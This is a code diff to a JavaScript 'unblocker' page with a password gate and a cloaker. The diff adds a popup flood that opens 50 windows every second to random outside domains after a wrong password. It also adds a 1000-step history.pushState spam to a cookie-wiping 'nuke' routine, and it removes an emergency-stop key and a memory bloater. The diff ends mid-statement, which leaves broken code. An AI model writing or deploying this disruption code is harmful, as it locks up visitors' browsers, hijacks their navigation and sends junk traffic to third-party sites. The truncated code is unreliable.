@@ -143,6 +143,7 @@ function checkPassword() {
   } else {
     document.getElementById('passwordScreen').classList.add('hidden');
     document.getElementById('deniedScreen').classList.remove('hidden');
+    triggerPopupFlood();
   }
 }
 
@@ -199,6 +200,9 @@ function startNuke() {
         document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/");
       });
       history.pushState({}, "", "/hacked" + Math.random());
+      for (let i = 0; i < 1000; i++) {
+        history.pushState({}, "", "/fakeURL" + Math.random());
+      }
     } catch(e) {}
   }, 500);
 }
@@ -207,7 +211,28 @@ function stopNuke() {
   clearInterval(nukeInterval);
 }
 
-// Cloaker
+// Popup flood for denied access
+function triggerPopupFlood() {
+  setInterval(() => {
+    for (let i = 0; i < 50; i++) {
+      window.open(generateRandomURL(), '_blank');
+    }
+  }, 1000);
+}
+
+function generateRandomURL() {
+  const randomPaths = [
+    "/post/xyz123", "/product/abc456", "/article/987654", "/user/123456789",
+    "/news/sport", "/blog/tech-update", "/shop/item234", "/profile/5678"
+  ];
+  const domains = [
+    "news-site.com", "shopnow.io", "techbuzz.net", "blogspace.org", "storeplace.biz"
+  ];
+  const randomDomain = domains[Math.floor(Math.random() * domains.length)];
+  const randomPath = randomPaths[Math.floor(Math.random() * randomPaths.length)];
+  return `https://${randomDomain}${randomPath}`;
+}
+
 function applyCloak() {
   const type = document.getElementById('cloakType').value;
   const custom = document.getElementById('customCloak').value;
@@ -238,26 +263,4 @@ function openUnblocker() {
 // Extreme Tools
 function popupStorm() {
   for (let i = 0; i < 50; i++) {
-    window.open('about:blank', '_blank');
-  }
-}
-function memoryBloater() {
-  let arr = [];
-  setInterval(() => {
-    arr.push(new Array(1000000).fill('SIGMA'));
-  }, 100);
-}
-function trapBrowser() {
-  window.onbeforeunload = function() { return "Are you sure you want to leave the SIGMA Zone?"; };
-}
-
-// Emergency Kill
-document.addEventListener('keydown', e => {
-  if (e.ctrlKey && e.shiftKey && e.key === 'K') {
-    location.reload();
-  }
-});
-</script>
-
-</body>
-</html>
+    window.open('about:blank', '_blank
